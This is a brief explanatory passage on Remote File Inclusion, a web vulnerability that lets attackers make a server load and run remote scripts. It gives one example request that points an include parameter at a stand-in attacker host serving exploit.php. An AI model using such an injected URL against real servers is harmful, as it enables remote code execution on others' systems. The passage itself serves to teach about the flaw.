Remote File Inclusion
Remote File Inclusion, or RFI, is a vulnerability that allows attackers to include remote files, often through input manipulation. This can lead to the execution of malicious scripts or code on the server.
Typically, RFI occurs in applications that dynamically include external files or scripts. Attackers can manipulate parameters in a request to point to external malicious files. For example, if a web application uses a URL in a GET parameter like include.php?page=http://attacker.com/exploit.php, an attacker can replace the URL with a path to a malicious script.
